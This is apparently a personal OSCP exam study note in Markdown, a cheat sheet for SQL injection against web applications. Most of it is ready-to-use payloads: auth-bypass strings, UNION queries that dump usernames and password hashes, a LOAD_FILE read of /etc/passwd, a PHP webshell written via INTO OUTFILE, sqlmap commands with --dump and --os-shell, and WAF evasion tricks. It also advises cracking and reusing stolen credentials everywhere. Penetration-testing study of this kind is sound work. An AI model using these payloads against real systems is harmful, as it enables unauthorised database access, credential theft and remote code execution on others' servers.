# 💥 SQL Injection

> Input reaches a SQL query unsanitised → you can **read/modify the database**, **bypass auth**, **dump credentials**, and sometimes **read/write files or get RCE**. On OSCP the usual payoff is **auth bypass** or **dumping a users table** to crack and reuse credentials.

Related: [[Web Exploitation]] · [[HTTP]] · [[Credential Attacks]] · [[MySQL]] · [[MSSQL]] · [[PostgreSQL]]

---

## 🧠 A PARAM IN A QUERY → THINK
- **Break it first:** a single `'` causing an error = strong signal.
- Decide the **type**: in-band (error/union), blind (boolean), blind (time). Pick the technique that the app supports.
- **Login form?** → try auth-bypass payloads before anything else.
- **DBMS matters** (MySQL/MSSQL/Postgres/Oracle/SQLite) — syntax & post-exploitation differ.
- Manual to understand, **sqlmap to grind** — but know the manual basics for exam credit.

## ⚡ QUICK TRIAGE / DETECTION
Break the query and observe:
```
'
```
```
' OR '1'='1
```
```
1' ORDER BY 5-- -      (increment until it errors → column count)
```
Time-based probe (delay = injectable, works even when blind):
```
1' AND SLEEP(5)-- -                     (MySQL)
1'; WAITFOR DELAY '0:0:5'-- -           (MSSQL)
1' AND pg_sleep(5)-- -                  (PostgreSQL)
```
**Look for:** SQL errors, changed results for `OR 1=1`, or a 5s delay = injection confirmed.

## 🔓 AUTH BYPASS (try on every login)
```
' OR '1'='1'-- -
' OR 1=1-- -
admin'-- -
admin' #
' OR '1'='1'/*
```
**Why:** turns `WHERE user='x' AND pass='y'` into an always-true condition → logs you in as the first/admin user.

## 📖 WHAT / WHY & TYPES
- **What:** attacker input alters SQL logic.
- **In-band – error-based:** DB errors leak data directly.
- **In-band – UNION:** append `UNION SELECT` to pull other tables into the visible output.
- **Blind – boolean:** page differs for true vs false conditions; infer data bit by bit.
- **Blind – time:** no visible difference; use `SLEEP`/`WAITFOR` to infer via delay.
- **Out-of-band:** DB makes a DNS/HTTP request carrying data (rare on OSCP).

## 🧰 UNION WORKFLOW (in-band)
1. Column count: `ORDER BY n` until error, or `UNION SELECT 1,2,3,...` until it renders.
2. Find visible columns (which numbers print on the page).
3. Pull metadata, then data:
```
' UNION SELECT 1,@@version,3-- -                         (MySQL/MSSQL version)
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,concat(user,':',password),3 FROM users-- -
```
**Result:** usernames + password hashes → crack ([[Credential Attacks]]) → reuse on the app / SSH.

## 📂 FILE READ / WRITE / RCE (privilege-dependent)
MySQL (needs FILE priv + `secure_file_priv`):
```
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -                       # read
' UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php'-- -   # write webshell
```
MSSQL (sysadmin → OS commands): pivot to [[MSSQL]] `xp_cmdshell`.
PostgreSQL (superuser → `COPY ... FROM PROGRAM`): pivot to [[PostgreSQL]].

## 🤖 SQLMAP (grind it out)
```bash
sqlmap -u "http://$IP/item.php?id=1" --batch --dbs
```
```bash
sqlmap -u "http://$IP/item.php?id=1" --batch -D appdb -T users --dump
```
```bash
sqlmap -r request.txt --batch --dump           # request.txt = saved Burp request (POST/cookies)
```
```bash
sqlmap -u "http://$IP/item.php?id=1" --batch --os-shell     # if privileges allow -> RCE
```
Useful flags: `--level=5 --risk=3` (deeper), `-p param` (target one param), `--technique=BEUST`, `--tamper=space2comment` (WAF).

## 🧗 WAF / FILTER BYPASS
| Blocked | Try |
|---|---|
| Spaces | `/**/`, `%09`, `%0a`, `+` |
| `OR`/`AND` keywords | `\|\|`/`&&`, mixed case `oR`, `%4f%52` |
| Comments | `-- -`, `#`, `/*...*/` |
| Quotes | hex `0x61646d696e`, `CHAR(97,...)` |
| `=` | `LIKE`, `BETWEEN`, `IN` |
| Generic | sqlmap `--tamper=` scripts |

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| `'` → SQL error | Injectable | ORDER BY / UNION | data |
| `OR 1=1` logs in | Auth bypass | proceed as admin | app access |
| Users table dumped | Hashes | crack → reuse ([[Credential Attacks]]) | creds/SSH |
| FILE priv (MySQL) | File R/W | LOAD_FILE / OUTFILE webshell | RCE |
| MSSQL sysadmin | OS exec | `xp_cmdshell` → [[MSSQL]] | shell |
| Only time-delay works | Blind | sqlmap time-based / boolean | slow dump |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No error on `'` | Try numeric context (no quotes), `)`/`))` to close brackets, other params |
| UNION won't render | Fix column count/types (`NULL`s), find the visible column, try error-based |
| Nothing visible at all | It's blind — boolean or time-based; let sqlmap handle it |
| sqlmap says "not injectable" | Save the full request (headers/cookies/POST) to a file, add `--level/--risk`, target `-p` |
| WAF blocking | `--tamper`, encoding, change method/content-type |
| Hashes won't crack | Bigger wordlist/rules; reuse any cleartext found elsewhere |

## 🧹 POST-EXPLOITATION
Dumped creds → crack + **reuse everywhere** ([[Credential Attacks]]); OUTFILE/xp_cmdshell → shell → [[Shells]] → privesc. Note the DBMS for deeper attacks ([[MySQL]]/[[MSSQL]]/[[PostgreSQL]]).

## ⚠️ COMMON MISTAKES
- Only testing quoted string context — **also test numeric** (`id=1 AND 1=1`).
- Forgetting the **comment terminator** (`-- -` with the trailing space, or `#`).
- Not saving the **full request** for sqlmap (missing cookies/POST → false negative).
- Dumping data but **not reusing** creds on other services.
- Ignoring **file/RCE** primitives when privileges allow.

## 🧭 OSCP EXAM MINDSET
On a login, try auth bypass first — it's a free win. Elsewhere, confirm with `'` and a `SLEEP`, then decide UNION vs blind. Manual UNION dumps of the users table are classic exam material; sqlmap is your grinder once you understand the injection. The prize is usually **credentials to crack and reuse**, occasionally a **file-write/xp_cmdshell shell**.

## ✅ DON'T MISS
- [ ] `'` and numeric-context break tests
- [ ] Auth-bypass payloads on every login
- [ ] Column count → UNION → dump users
- [ ] Time-based probe for blind
- [ ] sqlmap with full saved request + `-p`
- [ ] FILE/xp_cmdshell/COPY for RCE where privileged
- [ ] Crack + reuse creds everywhere

## 📇 CHEAT SHEET
```
'   ' OR 1=1-- -   admin'-- -                 # detect / auth bypass
```
```
1' ORDER BY 5-- -                              # column count
```
```
' UNION SELECT 1,concat(user,0x3a,password),3 FROM users-- -
```
```
1' AND SLEEP(5)-- -                            # blind (MySQL)
```
```bash
sqlmap -r req.txt --batch --dbs --dump
```
**Kill shots:** auth bypass · UNION dump users → crack → reuse · FILE/xp_cmdshell → shell.
